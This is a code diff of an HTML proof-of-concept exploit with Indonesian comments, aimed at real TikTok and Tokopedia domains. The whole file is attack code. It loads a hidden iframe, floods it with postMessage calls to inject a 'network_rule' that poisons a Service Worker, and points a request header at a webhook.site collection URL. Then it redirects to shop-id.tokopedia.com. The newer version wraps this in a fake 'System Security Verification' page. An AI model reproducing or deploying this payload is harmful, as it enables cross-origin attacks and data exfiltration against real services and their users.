@@ -1,45 +1,95 @@
 <!DOCTYPE html>
-<html>
-<head><title>DATA EXFILTRATION</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
-    <h1>[ PHASE: EXFILTRATION ]</h1>
-    <p id="msg">Injecting Data Harvester...</p>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Verification</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .box { border: 2px solid #0f0; display: inline-block; padding: 40px; box-shadow: 0 0 20px #0f0; }
+        .loading { font-size: 24px; margin-bottom: 10px; }
+        #progress { width: 300px; background: #333; height: 20px; margin: 20px auto; position: relative; }
+        #bar { width: 0%; height: 100%; background: #0f0; transition: width 0.2s; }
+    </style>
+</head>
+<body>
 
-    <iframe id="pwn_gate" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
+    <div class="box">
+        <div class="loading" id="status">[ INITIALIZING ATTACK ]</div>
+        <div id="progress"><div id="bar"></div></div>
+        <p id="sub-status">Targeting: shop-id.tokopedia.com</p>
+    </div>
+
+    <iframe id="pwn_gate" 
+            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
+            style="display:none;"></iframe>
 
     <script>
-    const gate = document.getElementById('pwn_gate');
-    const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
-
-    const payload = {
-        source: "main_thread",
-        eventName: "network_rule",
-        data: [{
-            ruleName: "ghost_exfil_v9",
-            global: true,
-            handlers: [{
-                handler: "replace",
-                type: "header",
-                field: "X-Pns-Referrer",
-                // TRIK: Kita kirim URL Webhook mentah dulu
-                value: "https://shop-id.tokopedia.com/redirect?url=" + webhook
- 
-            }]
-        }]
-    };
-
-    gate.onload = function() {
-        // Injeksi rule ke SW
-        for(let i=0; i<50; i++) {
-            gate.contentWindow.postMessage(payload, "*");
-        }
+        const gate = document.getElementById('pwn_gate');
+        const statusH1 = document.getElementById('status');
+        const statusP = document.getElementById('sub-status');
+        const bar = document.getElementById('bar');
         
-        setTimeout(() => {
-            // Pindah ke target untuk memicu eksekusi di konteks yang BENAR
-            location.href = "https://shop-id.tokopedia.com";
-        }, 3000);
-    };
-</script>
+        // --- KONFIGURASI ---
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI DENGAN ID LU
+        const targetURL = "https://shop-id.tokopedia.com/";
 
+        // Payload untuk meracuni Service Worker
+        const payload = {
+            source: "main_thread",
+            eventName: "network_rule",
+            data: [{
+                ruleName: "exploit_final_v10",
+                global: true,
+                conditions: [],
+                handlers: [{
+                    handler: "replace",
+                    type: "header",
+                    field: "X-Pns-Referrer",
+                    // Mengirimkan tanda eksfiltrasi ke webhook
+                    value: webhook + "?origin=tokopedia_pwned&ts=" + Date.now()
+                }]
+            }]
+        };
+
+        let progress = 0;
+
+        gate.onload = function() {
+            statusH1.innerText = "[ INJECTING PAYLOAD ]";
+            statusP.innerText = "Bypassing Same-Origin Policy...";
+
+            // 1. Wake up call untuk Service Worker
+            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
+
+            // 2. Heavy injection loop
+            let count = 0;
+            const bomb = setInterval(() => {
+                try {
+                    // Kirim ke semua origin (*) dan origin spesifik untuk memastikan masuk
+                    gate.contentWindow.postMessage(payload, "*");
+                    gate.contentWindow.postMessage(payload, "https://mon.tiktokv.com");
+                } catch(e) {}
+
+                count++;
+                progress = (count / 50) * 100;
+                bar.style.width = progress + "%";
+
+                if (count >= 50) {
+                    clearInterval(bomb);
+                    statusH1.innerText = "[ SYNCING CACHE ]";
+                    statusP.innerText = "Waiting for persistence (7s)...";
+                    
+                    // 3. Beri waktu Service Worker menulis ke Cache Storage
+                    setTimeout(() => {
+                        statusH1.innerText = "[ REDIRECTING ]";
+                        statusP.innerText = "Triggering poisoned worker on target...";
+                        
+                        // 4. Pindah ke target untuk mengeksekusi rule yang sudah terinjeksi
+                        location.href = targetURL;
+                    }, 7000);
+                }
+            }, 100);
+        };
+    </script>
 </body>
 </html>
